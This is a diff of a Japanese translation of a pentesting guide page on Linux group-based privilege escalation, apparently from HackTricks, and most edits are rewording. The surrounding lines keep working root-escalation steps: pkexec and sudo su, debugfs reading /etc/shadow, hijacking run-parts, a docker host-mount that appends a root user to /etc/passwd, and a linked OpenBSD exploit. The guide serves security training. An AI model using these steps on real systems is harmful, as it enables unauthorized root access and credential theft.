@@ -16,7 +16,7 @@
 ```
 これは、**sudoまたはadminグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-この場合、**rootになるには次のように実行するだけです**:
+この場合、**rootになるには次のコマンドを実行するだけです**:
 ```
 sudo su
 ```
@@ -26,12 +26,12 @@ sudo su
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-もしバイナリ **pkexec が SUID バイナリ** であり、あなたが **sudo** または **admin** に属している場合、`pkexec` を使用して sudo としてバイナリを実行できる可能性があります。\
+もしバイナリ **pkexec が SUID バイナリ** であり、あなたが **sudo** または **admin** に属している場合、`pkexec` を使用してバイナリを sudo として実行できる可能性があります。\
 これは通常、これらが **polkit ポリシー** 内のグループであるためです。このポリシーは基本的に、どのグループが `pkexec` を使用できるかを特定します。次のコマンドで確認してください:
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-そこでは、どのグループが **pkexec** を実行することを許可されているか、そして **デフォルトで** 一部のLinuxディストリビューションでは **sudo** および **admin** グループが表示されるかを見つけることができます。
+そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxディストロでは、**sudo**および**admin**グループが表示されるかを見つけることができます。
 
 **rootになるには、次のコマンドを実行できます**:
 ```bash
@@ -43,7 +43,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策はここにあります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
+**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策があります: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -62,13 +62,13 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-この場合、**rootになるには次のコマンドを実行するだけです**:
+この場合、**rootになるには次のように実行するだけです**:
 ```
 sudo su
 ```
 ## Shadow Group
 
-**shadow** グループのユーザーは **/etc/shadow** ファイルを **読む** ことができます:
+**shadow** グループのユーザーは **/etc/shadow** ファイルを **読み取る** ことができます:
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
@@ -76,9 +76,9 @@ So, read the file and try to **crack some hashes**.
 
 ## スタッフグループ
 
-**staff**: ユーザーがルート権限を必要とせずにシステムにローカル変更を加えることを許可します（`/usr/local/bin` の実行可能ファイルはすべてのユーザーのPATH変数に含まれており、同じ名前の `/bin` および `/usr/bin` の実行可能ファイルを「上書き」する可能性があります）。 監視/セキュリティに関連する「adm」グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)
+**staff**: ユーザーがルート権限を必要とせずにシステムにローカルな変更を加えることを許可します（`/usr/local/bin`内の実行可能ファイルは、すべてのユーザーのPATH変数に含まれており、同じ名前の`/bin`および`/usr/bin`内の実行可能ファイルを「上書き」する可能性があります）。 監視/セキュリティに関連する「adm」グループと比較してください。 [\[source\]](https://wiki.debian.org/SystemGroups)
 
-debianディストリビューションでは、`$PATH` 変数は `/usr/local/` が最優先で実行されることを示しています。特権ユーザーであろうとなかろうと。
+debianディストリビューションでは、`$PATH`変数は、特権ユーザーであろうとなかろうと、`/usr/local/`が最優先で実行されることを示しています。
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -88,7 +88,7 @@ $ echo $PATH
 ```
 `/usr/local`にあるいくつかのプログラムをハイジャックできれば、簡単にrootを取得できます。
 
-`run-parts`プログラムをハイジャックすることは、rootを取得する簡単な方法です。なぜなら、ほとんどのプログラムは`run-parts`を実行するからです（crontabやsshログイン時など）。
+`run-parts`プログラムをハイジャックすることは、rootを取得する簡単な方法です。なぜなら、ほとんどのプログラムは`run-parts`を実行するからです（crontabやSSHログイン時など）。
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -96,7 +96,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-または新しいsshセッションにログインしたとき。
+新しいSSHセッションにログインしたとき。
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -146,7 +146,7 @@ debugfs: cat /etc/shadow
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に**書き込もうとすると**、「**Permission denied**」エラーが発生します。
+しかし、**rootが所有するファイル**（例えば`/etc/shadow`や`/etc/passwd`）に**書き込み**を試みると、"**Permission denied**"エラーが発生します。
 
 ## Video Group
 
@@ -158,7 +158,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-**video group**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を**生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**video group**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -173,7 +173,7 @@ cat /sys/class/graphics/fb0/virtual_size
 
 ## ルートグループ
 
-デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルやいくつかの**ライブラリ**ファイル、または特権昇格に使用できる**その他の興味深いもの**を**変更**するアクセス権を持っているようです...
+デフォルトでは、**ルートグループのメンバー**は、**サービス**の設定ファイルや**ライブラリ**のファイル、または特権昇格に使用できる**その他の興味深いもの**を**変更**するアクセス権を持っているようです...
 
 **ルートメンバーが変更できるファイルを確認する**：
 ```bash
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Dockerグループ
 
-ホストマシンの**ルートファイルシステムをインスタンスのボリュームにマウント**できます。これにより、インスタンスが起動するとすぐにそのボリュームに`chroot`がロードされます。これにより、実質的にマシン上でルート権限を得ることができます。
+ホストマシンの**ルートファイルシステムをインスタンスのボリュームにマウント**できます。これにより、インスタンスが起動するとすぐにそのボリュームに`chroot`が読み込まれます。これにより、実質的にマシン上でルート権限を得ることができます。
 ```bash
 docker image #Get images from the docker service
 
@@ -193,7 +193,7 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-最後に、前の提案が気に入らない場合や、何らかの理由で機能していない場合（docker api firewall？）、ここで説明されているように、**特権コンテナを実行してそこから脱出する**ことを試すことができます：
+最終的に、前の提案が気に入らない場合や、何らかの理由で機能していない場合（docker api firewall？）、ここで説明されているように、**特権コンテナを実行してそこから脱出する**ことを試すことができます：
 
 {{#ref}}
 ../docker-security/
@@ -201,9 +201,13 @@ docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chr
 
 dockerソケットに書き込み権限がある場合は、[**dockerソケットを悪用して特権を昇格させる方法に関するこの投稿を読んでください**](../#writable-docker-socket)**。**
 
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+{{#ref}}
+https://github.com/KrustyHack/docker-privilege-escalation
+{{#endref}}
 
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+{{#ref}}
+https://fosterelli.co/privilege-escalation-via-docker.html
+{{#endref}}
 
 ## lxc/lxd グループ
 
@@ -218,7 +222,7 @@ dockerソケットに書き込み権限がある場合は、[**dockerソケッ�
 
 ## Auth グループ
 
-OpenBSD内では、**auth** グループは通常、使用されている場合に _**/etc/skey**_ と _**/var/db/yubikey**_ フォルダーに書き込むことができます。\
-これらの権限は、特権をrootに昇格させるために次のエクスプロイトを悪用することができます：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+OpenBSD内では、**auth** グループは通常、_**/etc/skey**_ および _**/var/db/yubikey**_ フォルダーに書き込むことができます。\
+これらの権限は、以下のエクスプロイトを使用して**特権を昇格させる**ために悪用される可能性があります：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 
 {{#include ../../../banners/hacktricks-training.md}}
